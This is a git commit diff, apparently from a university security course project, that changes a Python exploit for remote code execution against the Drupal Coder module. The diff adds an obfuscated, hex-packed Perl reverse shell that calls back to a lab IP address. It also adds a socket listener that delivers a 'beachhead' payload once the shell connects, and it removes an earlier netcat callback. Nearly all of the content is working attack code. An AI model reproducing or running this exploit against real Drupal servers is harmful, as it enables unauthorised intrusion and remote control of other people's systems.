b37a564b9b49974a00fb403ae511b5b2c9c5d791
Jeremy Dunn <jeremydunn@umass.edu>
2023-05-13 13:34:10 -0400

    Modify to work with reverse shell
    Bind shell doesn't seem to be working, so trying something completely
    different.  Exploit will start a reverse shell, wait for it to return,
    then send the beachhead to the reverse shell.
    
    Added Drupal_TEST.sh for testing purposes.  Will be integrated back in
    once the exploit is more repeatable.

--- beachhead/include/DrupalCoderExec.py
+++ beachhead/include/DrupalCoderExec.py
@@ -1,10 +1,12 @@
 from base64 import b64encode
 import requests
-import sys
+import threading
+import socket
 
 
 class DrupalCoderExec:
 
+    REV_SHELL = "perl -e 'system(pack(qq,H138,,qq,62617368202D632027303C2632342D3B657865632032343C3E2F6465762F7463702F31302E302E322E31382F35333631363B7368203C263234203E26323420323E26323427,))'"
     WEBSERVER_PATH = '/sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php'
 
     def __init__(self, beachhead: str):
@@ -26,16 +28,32 @@ class DrupalCoderExec:
         p += ' #";s:4:"name";s:4:"test";}}}'
 
         pl = "data://text/plain;base64," + b64encode(bytes(p, 'utf-8')).decode('utf-8')
-        
         return pl
+    
+    def send_beachhead(self, payload: str):
+        HOST = ''
+        PORT = 53616
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.bind((HOST, PORT))
+        sock.listen(1)
+        conn, addr = sock.accept()
+        conn.sendall(payload.encode('utf-8'))
+        conn.sendall(b'\n')
+        sock.close()
 
     def exploit(self, ip_addr: str, port: str, path: str) -> requests.models.Response:
+        thread = threading.Thread(target=self.send_beachhead, args=(self.beachhead,))
+        thread.start()
+        
         url = "http://" + ip_addr + ":" + port + path + self.WEBSERVER_PATH
         params = { 'file': self.create_payload(self.beachhead) }
-        return requests.get(url=url, params=params)
+        requests.get(url=url, params=params)
 
-        
+        thread.join()
+
 
 if __name__ == "__main__":
-    coder_exec = DrupalCoderExec('nc 10.0.2.45 37123')
-    coder_exec.exploit(sys.argv[1], sys.argv[2], sys.argv[3])
+    with open ('/home/perditus/School/CS564/r3se-rch/beachhead/include/Drupal_TEST.sh', 'r') as f:
+        payload = f.read()
+    coder_exec = DrupalCoderExec(payload)
+    coder_exec.exploit('10.0.2.46', '80', '/drupal')
